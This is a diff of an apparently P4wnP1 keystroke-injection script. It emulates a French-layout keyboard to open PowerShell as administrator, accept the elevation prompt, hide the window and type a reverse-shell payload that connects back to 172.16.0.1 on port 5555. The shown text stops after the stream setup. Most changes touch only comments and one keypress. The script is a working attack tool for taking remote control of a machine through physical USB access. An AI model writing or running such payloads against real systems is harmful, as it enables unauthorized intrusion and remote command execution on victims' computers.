@@ -8,19 +8,19 @@
 layout('fr');			// FR keyboard layout
 
 typingSpeed(0,0)
-press("GUI r")			
+press("GUI r")			// win + r
 delay(400)				
-type("powershell")			
-press("CTRL SHIFT ENTER")	// run administrator
+type("powershell")			// powershell.exe
+press("CTRL SHIFT ENTER")	// run as administrator
 delay(1500)			
-press("SHIFT TAB")		
+press("LEFT")		
 press("ENTER")			
 delay(3000)
 
 
 type("PowerShell.exe -windowstyle hidden { \n") // hide windows powershell
 
-type("$client = [System.Net.Sockets.TCPClient]::new('172.16.0.1', 5555)\n") // IP lan P4wnP1 : 172.16.0.1; PORT used : 5555
+type("$client = [System.Net.Sockets.TCPClient]::new('172.16.0.1', 5555)\n") // IP lan P4wnP1 : 172.16.0.1 ; PORT used : 5555
 type("[byte[]]$bytes = (0..65535).ForEach{ 0 }\n")
 
 type("$stream = $client.GetStream()\n")
